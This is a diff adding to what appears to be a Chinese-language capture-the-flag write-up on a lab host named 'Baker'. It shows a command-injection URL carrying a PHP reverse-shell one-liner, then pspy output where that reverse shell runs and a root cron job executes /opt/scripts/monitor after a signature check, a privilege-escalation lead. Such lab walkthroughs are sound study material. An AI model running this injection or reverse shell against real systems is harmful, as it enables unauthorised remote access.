@@ -263,4 +263,139 @@ http://baker.dsz/pages/test.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.216.
 ```
 
 传pspy看一下：
+```bash
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2026/05/10 13:50:39 CMD: UID=104   PID=2656   | ./pspy64
+2026/05/10 13:50:39 CMD: UID=104   PID=2646   | /bin/sh -i
+2026/05/10 13:50:39 CMD: UID=104   PID=2645   | php -r $sock=fsockopen("10.251.177.81",7777);exec("/bin/sh -i <&3 >&3 2>&3");
+2026/05/10 13:50:39 CMD: UID=104   PID=2604   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=104   PID=2603   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=104   PID=2600   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=0     PID=2583   | /sbin/getty 38400 tty6
+2026/05/10 13:50:39 CMD: UID=0     PID=2579   | /sbin/getty 38400 tty5
+2026/05/10 13:50:39 CMD: UID=0     PID=2575   | /sbin/getty 38400 tty4
+2026/05/10 13:50:39 CMD: UID=0     PID=2571   | /sbin/getty 38400 tty3
+2026/05/10 13:50:39 CMD: UID=0     PID=2567   | /sbin/getty 38400 tty2
+2026/05/10 13:50:39 CMD: UID=0     PID=2566   | /sbin/getty -I \033c 38400 tty1
+2026/05/10 13:50:39 CMD: UID=123   PID=2504   | /usr/sbin/ntpd -N -p pool.ntp.org -n
+2026/05/10 13:50:39 CMD: UID=0     PID=2477   |
+2026/05/10 13:50:39 CMD: UID=104   PID=2470   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=104   PID=2469   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=104   PID=2468   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=104   PID=2467   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=104   PID=2466   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=0     PID=2456   | logger -t mysqld -p daemon error
+2026/05/10 13:50:39 CMD: UID=101   PID=2455   | /usr/bin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mariadb/plugin --user=mysql --pid-file=/run/mysqld/mariadb.pid
+2026/05/10 13:50:39 CMD: UID=0     PID=2351   | /usr/sbin/crond -c /etc/crontabs -f
+2026/05/10 13:50:39 CMD: UID=0     PID=2325   | /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
+2026/05/10 13:50:39 CMD: UID=0     PID=2295   | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+2026/05/10 13:50:39 CMD: UID=0     PID=2265   | /sbin/acpid -f
+2026/05/10 13:50:39 CMD: UID=0     PID=2238   | /sbin/syslogd -t -n
+2026/05/10 13:50:39 CMD: UID=0     PID=2178   | /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:Baker
+2026/05/10 13:50:39 CMD: UID=0     PID=1959   |
+2026/05/10 13:50:39 CMD: UID=0     PID=1958   |
+2026/05/10 13:50:39 CMD: UID=0     PID=1728   |
+2026/05/10 13:50:39 CMD: UID=0     PID=1662   |
+2026/05/10 13:50:39 CMD: UID=0     PID=1286   |
+2026/05/10 13:50:39 CMD: UID=0     PID=1285   |
+2026/05/10 13:50:39 CMD: UID=0     PID=1232   |
+2026/05/10 13:50:39 CMD: UID=0     PID=944    |
+2026/05/10 13:50:39 CMD: UID=0     PID=943    |
+2026/05/10 13:50:39 CMD: UID=0     PID=942    |
+2026/05/10 13:50:39 CMD: UID=0     PID=941    |
+2026/05/10 13:50:39 CMD: UID=0     PID=902    |
+2026/05/10 13:50:39 CMD: UID=0     PID=901    |
+2026/05/10 13:50:39 CMD: UID=0     PID=897    |
+2026/05/10 13:50:39 CMD: UID=0     PID=896    |
+2026/05/10 13:50:39 CMD: UID=0     PID=884    |
+2026/05/10 13:50:39 CMD: UID=0     PID=782    |
+2026/05/10 13:50:39 CMD: UID=0     PID=753    |
+2026/05/10 13:50:39 CMD: UID=0     PID=509    |
+2026/05/10 13:50:39 CMD: UID=0     PID=483    |
+2026/05/10 13:50:39 CMD: UID=0     PID=482    |
+2026/05/10 13:50:39 CMD: UID=0     PID=481    |
+2026/05/10 13:50:39 CMD: UID=0     PID=475    |
+2026/05/10 13:50:39 CMD: UID=0     PID=220    |
+2026/05/10 13:50:39 CMD: UID=0     PID=213    |
+2026/05/10 13:50:39 CMD: UID=0     PID=212    |
+2026/05/10 13:50:39 CMD: UID=0     PID=211    |
+2026/05/10 13:50:39 CMD: UID=0     PID=198    |
+2026/05/10 13:50:39 CMD: UID=0     PID=91     |
+2026/05/10 13:50:39 CMD: UID=0     PID=76     |
+2026/05/10 13:50:39 CMD: UID=0     PID=56     |
+2026/05/10 13:50:39 CMD: UID=0     PID=55     |
+2026/05/10 13:50:39 CMD: UID=0     PID=54     |
+2026/05/10 13:50:39 CMD: UID=0     PID=53     |
+2026/05/10 13:50:39 CMD: UID=0     PID=52     |
+2026/05/10 13:50:39 CMD: UID=0     PID=51     |
+2026/05/10 13:50:39 CMD: UID=0     PID=50     |
+2026/05/10 13:50:39 CMD: UID=0     PID=49     |
+2026/05/10 13:50:39 CMD: UID=0     PID=48     |
+2026/05/10 13:50:39 CMD: UID=0     PID=46     |
+2026/05/10 13:50:39 CMD: UID=0     PID=45     |
+2026/05/10 13:50:39 CMD: UID=0     PID=44     |
+2026/05/10 13:50:39 CMD: UID=0     PID=43     |
+2026/05/10 13:50:39 CMD: UID=0     PID=42     |
+2026/05/10 13:50:39 CMD: UID=0     PID=41     |
+2026/05/10 13:50:39 CMD: UID=0     PID=40     |
+2026/05/10 13:50:39 CMD: UID=0     PID=39     |
+2026/05/10 13:50:39 CMD: UID=0     PID=38     |
+2026/05/10 13:50:39 CMD: UID=0     PID=37     |
+2026/05/10 13:50:39 CMD: UID=0     PID=36     |
+2026/05/10 13:50:39 CMD: UID=0     PID=35     |
+2026/05/10 13:50:39 CMD: UID=0     PID=34     |
+2026/05/10 13:50:39 CMD: UID=0     PID=33     |
+2026/05/10 13:50:39 CMD: UID=0     PID=32     |
+2026/05/10 13:50:39 CMD: UID=0     PID=28     |
+2026/05/10 13:50:39 CMD: UID=0     PID=27     |
+2026/05/10 13:50:39 CMD: UID=0     PID=26     |
+2026/05/10 13:50:39 CMD: UID=0     PID=25     |
+2026/05/10 13:50:39 CMD: UID=0     PID=24     |
+2026/05/10 13:50:39 CMD: UID=0     PID=23     |
+2026/05/10 13:50:39 CMD: UID=0     PID=22     |
+2026/05/10 13:50:39 CMD: UID=0     PID=21     |
+2026/05/10 13:50:39 CMD: UID=0     PID=20     |
+2026/05/10 13:50:39 CMD: UID=0     PID=19     |
+2026/05/10 13:50:39 CMD: UID=0     PID=18     |
+2026/05/10 13:50:39 CMD: UID=0     PID=17     |
+2026/05/10 13:50:39 CMD: UID=0     PID=16     |
+2026/05/10 13:50:39 CMD: UID=0     PID=15     |
+2026/05/10 13:50:39 CMD: UID=0     PID=14     |
+2026/05/10 13:50:39 CMD: UID=0     PID=13     |
+2026/05/10 13:50:39 CMD: UID=0     PID=12     |
+2026/05/10 13:50:39 CMD: UID=0     PID=11     |
+2026/05/10 13:50:39 CMD: UID=0     PID=10     |
+2026/05/10 13:50:39 CMD: UID=0     PID=8      |
+2026/05/10 13:50:39 CMD: UID=0     PID=7      |
+2026/05/10 13:50:39 CMD: UID=0     PID=6      |
+2026/05/10 13:50:39 CMD: UID=0     PID=5      |
+2026/05/10 13:50:39 CMD: UID=0     PID=4      |
+2026/05/10 13:50:39 CMD: UID=0     PID=3      |
+2026/05/10 13:50:39 CMD: UID=0     PID=2      |
+2026/05/10 13:50:39 CMD: UID=0     PID=1      | /sbin/init
+2026/05/10 13:51:00 CMD: UID=0     PID=2665   | /bin/bash -c /usr/local/bin/check-monitor.sh
+2026/05/10 13:51:00 CMD: UID=0     PID=2666   | objcopy --dump-section .note.sig=/tmp/sig_verify.bin /opt/scripts/monitor
+2026/05/10 13:51:00 CMD: UID=0     PID=2667   | grep -q Maze-Sec-Internal-Only /tmp/sig_verify.bin
+2026/05/10 13:51:00 CMD: UID=0     PID=2668   | /opt/scripts/monitor
+2026/05/10 13:52:00 CMD: UID=0     PID=2671   | /bin/bash -c /usr/local/bin/check-monitor.sh
+2026/05/10 13:52:00 CMD: UID=0     PID=2673   | /bin/sh /usr/local/bin/check-monitor.sh
+2026/05/10 13:52:00 CMD: UID=0     PID=2674   | /opt/scripts/monitor
+2026/05/10 13:52:01 CMD: UID=0     PID=2675   | rm -f /tmp/sig_verify.bin
+```
+发现最后这里重复执行，是定时任务。
